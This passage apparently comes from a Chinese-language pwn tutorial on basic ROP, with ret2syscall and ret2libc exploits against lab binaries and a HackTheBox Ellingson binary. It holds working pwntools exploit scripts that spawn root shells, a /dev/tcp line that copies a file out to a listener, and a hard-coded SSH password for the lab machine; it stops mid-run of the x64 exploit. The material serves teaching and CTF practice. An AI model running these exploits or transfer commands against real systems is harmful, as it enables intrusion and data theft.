0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**
```

命令字段 `0x080be408` 地址

```bash
➜  ret2syscall ROPgadget --binary ret2syscall --string "/bin/sh"         
Strings information
============================================================
0x080be408 : /bin/sh
```

中断代码地址 `0x08049421`

```bash
➜  ret2syscall ROPgadget --binary ret2syscall --only "int"   
Gadgets information
============================================================
0x08049421 : int 0x80
0x080890b5 : int 0xcf
```

计算偏移量，为`112`

```bash
pwndbg> cyclic 200
aaaabaaacaaa...waabxaabyaab

pwndbg> run
Starting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall 
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
aaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.                  
0x62616164 in ?? ()                                                                                               
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  
───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─
 ECX  0xfbad2288                                                                                                  
 EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0                                                                         
 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]
 ESI  0             
 ESP  0xffffd100 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x62616164 ('daab')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────
Invalid address 0x62616164

pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

使用代码块绘制的利用链

```bash
           |-----------------------------| 高地址
           | ...                         |
           |-----------------------------|
           | int_0x80_addr               |  <-- ret from pop_..._ret
           |-----------------------------|
           | bin_sh_addr                 |  <-- pop into ebx
           |-----------------------------|
           | 0x0                         |  <-- pop into ecx
           |-----------------------------|
           | 0x0                         |  <-- pop into edx
           |-----------------------------|
           | pop_edx_ecx_ebx_ret_addr    |  <-- ret from pop_eax_ret
           |-----------------------------|
           | 0xb                         |  <-- pop into eax
           |-----------------------------|
           | pop_eax_ret_addr            |  <-- Overwritten return address
   ebp     |-----------------------------|
           | ...                         |
           |-----------------------------|
   buf ->  | gets buffer start           |
   esp     |-----------------------------| 低地址
```

编写`EXP`

```bash
from pwn import *

pop_eax_ret_addr = 0x080bb196
pop_edx_ecx_ebx_addr = 0x0806eb90
bin_sh_addr = 0x080be408
int_0x80_addr = 0x08049421

sh = process('./ret2syscall')
sh.sendline(b'A'*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))
sh.interactive()
```

```bash
(pwn) ➜  ret2syscall python exp.py
[+] Starting local process './ret2syscall': pid 2825
[*] Switching to interactive mode
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
$ whoami
root
```

## ret2libc

`ret2libc` 即控制函数的执行 `libc` 中的函数，通常是返回至某个函数的 `plt` 处或者函数的具体位置 (即函数对应的 `got` 表项的内容)。

其中 `libc` 指的是`C` 标准库（`standard C library`）的实现，通常是 `/lib/x86_64-linux-gnu/libc.so.6` 或 `/lib/i386-linux-gnu/libc.so.6`

`libc`库是`Linux`下的`C`函数库，而`libc`库中存放的就是这些函数的偏移地址，所以只要确定了`libc`库的版本，就能知道函数的偏移地址，但是我们这里在本地运行的样本，所以可以直接忽视。

### ret2libc1

使用 IDA 反编译，`gets`存在缓冲区溢出漏洞

![image.png](/post-images/PWN%20-%20基本ROP/image7.png)

`secure` 中的 `system`被修改了，所以无法使用`ret2text`

![image.png](/post-images/PWN%20-%20基本ROP/image8.png)

`32` 位程序，并且调用动态链接库

```bash
➜  ret2libc file ret2libc1         
ret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
```

`NX` 启动，所以`ret2shellcode` 也无法使用

```bash
➜  ret2libc checksec ret2libc1 
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

因为这里用了动态链接库，所以优先使用 `ret2libc`

字符串中能看到 `/bin/sh` `08048720`

![image.png](/post-images/PWN%20-%20基本ROP/image9.png)

尝试寻找 `system`函数，也找到了`08048460`

![image.png](/post-images/PWN%20-%20基本ROP/image10.png)

计算偏移值（和上边一样的操作）

```bash
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

```bash
(pwn) ➜  ret2libc cat exp.py 
from pwn import *

system_plt_addr = 0x08048460
bin_sh_addr = 0x8048720
sh = process('./ret2libc1')
sh.sendline(112 * b'A' + p32(system_plt_addr) + 4 * b'A' + p32(bin_sh_addr))
sh.interactive()
```

可以看到为什么要加上 `4 * b'A'` ，因为这是给`system`的假的返回地址

```bash
           | ... higher addresses ...   |
           +----------------------------+
           | p32(bin_sh_addr)           | <-- (被我们写入) system 的参数
           +----------------------------+
           | 4 * b'A' (0x41414141)      | <-- (被我们写入) system 的假返回地址
           +----------------------------+
           | p32(system_plt_addr)       | <-- (被我们写入) 覆盖了 main 的返回地址
           +----------------------------+
           | 4 字节的 'A'               | <-- (被我们写入) 覆盖了 old EBP
           +----------------------------+
           | 108 字节的 'A'             | \
           | ...                        |  |
           | 'A'                        |  } 填充了整个 buffer 和额外的空间
           | 'A'                        | /
           +----------------------------+ <-- buffer 的起始地址
           | ... lower addresses ...    |
```

```bash
(pwn) ➜  ret2libc python exp.py
[+] Starting local process './ret2libc1': pid 3166
[*] Switching to interactive mode
RET2LIBC >_<
$ whoami
root
```

### ret2libc2

依旧是 `gets` ，存在缓冲区溢出漏洞

![image.png](/post-images/PWN%20-%20基本ROP/image11.png)

`checksec`以及文件类型，和`ret2libc1`基本没差

```bash
(pwn) ➜  ret2libc checksec ret2libc1
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
(pwn) ➜  ret2libc file ret2libc2         
ret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
```

字符串中找不到 `/bin/sh`了

![image.png](/post-images/PWN%20-%20基本ROP/image12.png)

`system` 函数还在 `0x08048490`

![image.png](/post-images/PWN%20-%20基本ROP/image13.png)

所以需要我们构造 `/bin/sh` `0x08048480`

可以看到还存在`gets` `0x08048460`

![image.png](/post-images/PWN%20-%20基本ROP/image14.png)

我们可以多调用一次`gadget` ，所以我们要找到一片可读写的缓冲区

![image.png](/post-images/PWN%20-%20基本ROP/image15.png)

`buf2`区域刚好可以 `0x0804A080`

![image.png](/post-images/PWN%20-%20基本ROP/image16.png)

此时我们还要保持堆栈平衡，也就是`gets`执行完时，`gets`的返回地址会处于栈顶，但是接下来我们调用`system`函数，所以我们需要在返回地址`+4`(就是要把`buf`清理掉，让`ROP`链指向下一条也就是`system`)，所以这里可以寻找 `pop xxx ;ret` 或者 `add esp 4; ret`

```bash
ESP --> | p32(pop_ebx_addr) |  <-- gets函数的“返回地址”
        +-------------------+
        |  p32(buf2_addr)   |  <-- gets函数的参数（gets写入后，我们需要将其弹出）
        +-------------------+
        | p32(libc_system_addr) |
        +-------------------+
        |      b'B'*4       |
        +-------------------+
        |  p32(buf2_addr)   |
        +-------------------+
```

使用`ROPgadget`来寻找`0x0804843d` 就符合

```bash
(pwn) ➜  ret2libc ROPgadget --binary ret2libc2 --only "pop|ret"
Gadgets information
============================================================
0x0804872f : pop ebp ; ret
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```

计算偏移值，也和上边一样是`112`

```bash
from pwn import *

gets_plt_addr = 0x08048460
pop_ebx_ret_addr = 0x0804843d
system_plt_addr = 0x08048490
buf2 = 0x0804A080

sh = process('./ret2libc2')
sh.sendline(112 * b'A' + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b'A' + p32(buf2))
sh.sendline('/bin/sh')
sh.interactive()
```

```bash
(pwn) ➜  ret2libc python exp.py   
[+] Starting local process './ret2libc2': pid 4087
/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.sendline('/bin/sh')
[*] Switching to interactive mode
Something surprise here, but I don't think it will work.
What do you think ?$ id
uid=0(root) gid=0(root) 组=0(root)
```

### ret2libc3

依旧是`gets`

![image.png](/post-images/PWN%20-%20基本ROP/image17.png)

保护机制和文件类型

```bash
➜  ret2libc checksec ret2libc3
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
➜  ret2libc file ret2libc3
ret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
```

存在`gets`，可以用来构造`/bin/sh`

![image.png](/post-images/PWN%20-%20基本ROP/image18.png)

![image.png](/post-images/PWN%20-%20基本ROP/image19.png)

但是`system`函数也没了，所以我们要寻找`system`函数

找到`system()`函数和`/bin/sh`字符串在`libc`中的地址

- 首先获得一个函数的真实地址，例如：`__libc_start_main`，`puts`
- 得到真实地址后，根据最后三位即可得到 libc 版本
- 得到 libc 版本后就可以很容易确定获得的真实函数的偏移地址（这里假设`puts`）
- 计算基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址
- 得到 libc 版本后获取 system 地址与 /bin/sh 的偏移地址
- 根据 真实地址 = 基地址 + 偏移地址
- 再次执行源程序
- 触发栈溢出执行 `system(‘/bin/sh’)`

编写脚本泄露`libc_start_main`的真实地址

```bash
from pwn import *
e = ELF('./ret2libc3')
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('泄露 libc_start_main_got_addr 并返回到 main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")
```

![image.png](/post-images/PWN%20-%20基本ROP/image20.png)

再下一步我们要得到 `libc`版本和基地址以及`system` 函数和`/bin/sh`字符串的地址

```bash
from pwn import *
from LibcSearcher import *
e = ELF('./ret2libc3')
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('泄露 libc_start_main_got_addr 并返回到 main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")

print('得到 libc 版本，并计算基地址和 system & /bin/sh 地址')
libc = LibcSearcher("__libc_start_main", libc_start_main_real_addr)
libcbase = libc_start_main_real_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('/bin/sh')
print(f'基地址:{libcbase},system地址:{system_addr},/bin/sh地址:{bin_sh_addr}')
```

这里吐槽一下`LibcSearcher` ，一直提示`[+] No libc satisfies constraints.` 貌似`fork`太久远了没更新

这里直接链接本地的`libc`库了，不使用`LibcSearcher`

```bash
from pwn import *
e = ELF('./ret2libc3')
libc = ELF("/lib32/libc.so.6")
sh = process('./ret2libc3')
puts_plt_addr = e.plt['puts']
libc_start_main_got_addr = e.got['__libc_start_main']
main_addr = e.symbols['main']

print('泄露 libc_start_main_got_addr 并返回到 main')
payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)
sh.sendlineafter(b'Can you find it !?',payload1)
libc_start_main_real_addr = u32(sh.recv()[0:4])
print(f"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}")

print('计算基地址和 system & /bin/sh 地址')
libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']
system_addr = libcbase + libc.sym['system']
bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f'基地址:{hex(libcbase)},system地址:{hex(system_addr)},/bin/sh地址:{hex(bin_sh_addr)}')
```

所有参数我们都有了，就可以构造`payload`了

1. 方案 `1`（这里仿照`wiki`上的写）：
    
    ```bash
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    libc_start_main_addr = e.got['__libc_start_main']
    main_addr = e.symbols['main']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)
    p.sendlineafter("Can you find it !?", payload1)
    libc_start_main_real_addr = u32(p.recv()[0:4])
    print(f"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}")
    
    libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    输出（失败了）：
    
    ```bash
    (pwn) ➜  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 4574
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    libc_start_main_real_addr = 0x206f4e0a
    libcbase = 0x206d010a
    system_real_addr = 0x2072232a
    bin_sh_addr = 0x20896f5c
    [*] Switching to interactive mode
    [*] Got EOF while reading in interactive
    $ id
    [*] Process './ret2libc3' stopped with exit code -11 (SIGSEGV) (pid 4574)
    [*] Got EOF while sending in interactive
    ```
    
2. 方案 2（大佬通过`puts`而不是`libc_start_main` ，并且二次返回到的更早之前）：
    
    ```bash
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    puts_got_addr = e.got['puts']
    main_addr = e.symbols['_start']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)
    p.sendlineafter("Can you find it !?", payload1)
    puts_real_addr = u32(p.recv()[0:4])
    print(f"puts_real_addr = {hex(puts_real_addr)}")
    
    libcbase = puts_real_addr - libc.sym['puts']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 112 + p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    输出（成功）：
    
    ```bash
    (pwn) ➜  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 4630
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    puts_real_addr = 0xf7da72a0
    libcbase = 0xf7d2b000
    system_real_addr = 0xf7d7d220
    bin_sh_addr = 0xf7ef1e52
    [*] Switching to interactive mode
    $ id
    uid=0(root) gid=0(root) 组=0(root)
    ```
    
3. 方案3，修复`wiki`上的方案
    
    不使用`__libc_start_main` 来获取第一个真实地址，而使用`puts`
    
    ```bash
    (pwn) ➜  ret2libc cat exp.py
    from pwn import *
    e = ELF('./ret2libc3')
    p = process('./ret2libc3')
    libc = ELF('/lib32/libc.so.6')
    
    puts_plt_addr = e.plt['puts']
    libc_start_main_addr = e.got['puts']
    main_addr = e.symbols['main']
    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)
    p.sendlineafter("Can you find it !?", payload1)
    libc_start_main_real_addr = u32(p.recv()[0:4])
    print(f"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}")
    
    libcbase = libc_start_main_real_addr - libc.sym['puts']
    print(f"libcbase = {hex(libcbase)}")
    system_real_addr = libcbase + libc.sym['system']
    print(f"system_real_addr = {hex(system_real_addr)}")
    bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
    print(f"bin_sh_addr = {hex(bin_sh_addr)}")
    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)
    p.sendline(payload2)
    p.interactive()
    ```
    
    输出（成功）
    
    ```bash
    (pwn) ➜  ret2libc python exp.py
    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
        Debuginfo:  Yes
    [+] Starting local process './ret2libc3': pid 6021
    [*] '/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      res = self.recvuntil(delim, timeout=timeout)
    libc_start_main_real_addr = 0xf7d902a0
    libcbase = 0xf7d14000
    system_real_addr = 0xf7d66220
    bin_sh_addr = 0xf7edae52
    [*] Switching to interactive mode
    $ id
    uid=0(root) gid=0(root) 组=0(root)
    ```
    
    为什么第二次调用时使用`104`来填充栈而不是`112`？
    
    因为程序真正的入口是`_start`，而不是`main` ，我们来看`_start`
    
    ![image.png](/post-images/PWN%20-%20基本ROP/image21.png)
    
    调用`main`前会先调用`and     esp, 0FFFFFFF0h` 来使堆栈平衡
    
    可以在 `_start` 处断点，然后`si`来一步一步调试查看 `esp` 的变化
    
    第一次我们运行`payload1`的时候是直接从`_start`开始运行的，会经过`and     esp, 0FFFFFFF0h` 使堆栈平衡，使栈 `+8` 得到`112` ，但是我们第二次执行`payload2`不是从`_start`开始，直接从`main`开始，`and`不执行，所以没有`+8` ，所以此时esp到覆盖返回地址为`112-8=104`
    
    > https://xz.aliyun.com/news/14087
    > 
    
    也可以说第一次运行 `_start` + `main` 一共 `112` ，而第二次直接从`main`开始一共用了`104`
    

### 方案`1`失败的原因是

泄露的地址不正确（坏字符问题）

`libc_start_main_real_addr` 的值是 `0x206f4e0a`。`puts` 函数是用来打印字符串的，它遇到 `\n` (`0x0a`) 就会停止读取并输出换行符，然后返回。看一下这个地址 `0x206f4e0a`，它的最后一个字节是 `0a`，也就是换行符 `\n`。这就导致解包出来的 `libc_start_main_real_addr` 是一个完全错误的值 `0x206f4e0a`


### ret2libc - x64

来自 `HackTheBox - Ellingson` 

运行它的时候，会让你输入密码

```bash
margo@ellingson:~$ garbage
Enter access password: 111111111111111111111111111111111111111111111111111111

access denied.
```

拉出去逆向看一眼

```bash
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-8h] BYREF
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  v4 = check_user(argc, argv, envp);
  set_username(v4);
  if ( !(unsigned int)auth(v4) )
    exit(-1);
  puts("[+] W0rM || Control Application");
  puts("[+] ---------------------------");
  puts("Select Option");
  puts("1: Check Balance");
  puts("2: Launch");
  puts("3: Cancel");
  puts("4: Exit");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        printf("> ");
        __isoc99_scanf("%d%*c", &v3);
        if ( v3 != 2 )
          break;
        launch();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_14;
      checkbalance();
    }
    if ( v3 != 3 )
    {
      if ( v3 == 4 )
        exit(0);
LABEL_14:
      puts("Unknown option");
      exit(-1);
    }
    cancel();
  }
}
```

我们在开始运行的 `auth` 函数中发现了存在缓冲区溢出漏洞

也就是让我们输入密码的地方，会有缓冲区溢出，`gets()` 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如`200`个字符），多出来的`100`个字符就会溢出，覆盖掉栈上 `s1` 相邻的其他数据。

```bash
__int64 __fastcall auth(int a1)
{
  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF
  char s1[100]; // [rsp+80h] [rbp-80h] BYREF
  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF
  int v5; // [rsp+F0h] [rbp-10h]

  v5 = a1;
  strcpy(v4, username);
  printf("Enter access password: ");
  gets(s1);
  putchar(10);
  if ( !strcmp(s1, "N3veRF3@r1iSh3r3!") )
  {
    strcpy(dest, "access granted for user: ");
    strcat(dest, v4);
    syslog(6, dest);
    puts("access granted.");
    return 1LL;
  }
  else
  {
    puts("access denied.");
    return 0LL;
  }
}
```

`64`位程序

```bash
➜  Ellingson file garbage 
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

保护措施情况，开启了`NX` 

```bash
➜  Ellingson checksec garbage 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

检查一下是否开启了 `ALSR` ，开启了完全`ALSR`

```bash
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

这里要使用 `ret2libc` 攻击

寻找一个真实的地址，首先我们查看`libc`文件

```bash
margo@ellingson:~$ ldd /usr/bin/garbage 
        linux-vdso.so.1 (0x00007ffcd37ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)
```

将`/lib/x86_64-linux-gnu/libc.so.6`下载到靶机中

```bash
// kali
➜  Ellingson nc -lvp 1234 > libc.so.6
// Machine
margo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234
```

首先判断填充值，这里使用`garbage` 

```bash
(pwn) ➜  Ellingson pwndbg garbage 
pwndbg> cyclic 1024
aaaabaaacaaadaaa...acwaacxaacyaac
pwndbg> run
Starting program: /root/Desktop/HackTheBox/Ellingson/garbage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter access password:aaaabaaacaaadaaa...acwaacxaacyaac
```

程序果不其然崩溃了

![image.png](/post-images/PWN%20-%20基本ROP/image22.png)

计算偏移值，这里使用`msf`

```bash
➜  Ellingson /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

![image.png](/post-images/PWN%20-%20基本ROP/image23.png)

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 136
```

得到偏移值`136` （PS：这里使用`pwndbg`的`cyclic`无法得到正确偏移值，但是`WP`中使用`gef`等都可以很容易就得到偏移值）

得到偏移值后，我们选择一下获得哪个`plt`函数的真实地址

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401170:
0x401030: putchar@plt
0x401040: strcpy@plt
0x401050: puts@plt
0x401060: fclose@plt
0x401070: getpwuid@plt
0x401080: getuid@plt
0x401090: printf@plt
0x4010a0: rewind@plt
0x4010b0: fgetc@plt
0x4010c0: read@plt
0x4010d0: fgets@plt
0x4010e0: strcmp@plt
0x4010f0: getchar@plt
0x401100: gets@plt
0x401110: syslog@plt
0x401120: access@plt
0x401130: fopen@plt
0x401140: __isoc99_scanf@plt
0x401150: strcat@plt
0x401160: exit@plt
```

`x64` 传参需要使用寄存器，`0x000000000040179b` 符合

```bash
(pwn) ➜  Ellingson ROPgadget --binary garbage --only "pop|ret"
Gadgets information
============================================================
0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401798 : pop r14 ; pop r15 ; ret
0x000000000040179a : pop r15 ; ret
0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401239 : pop rbp ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089

Unique gadgets found: 15
```

这里选择获得`puts@plt` ，我们通过`pwn`连接`ssh` 来调试

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_add:{hex(puts_real_add)}")
```

运行后我们的得到了`put`的真实地址`0x7f8eed3569c0`

```bash
(pwn) ➜  Ellingson python exp.py                              
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
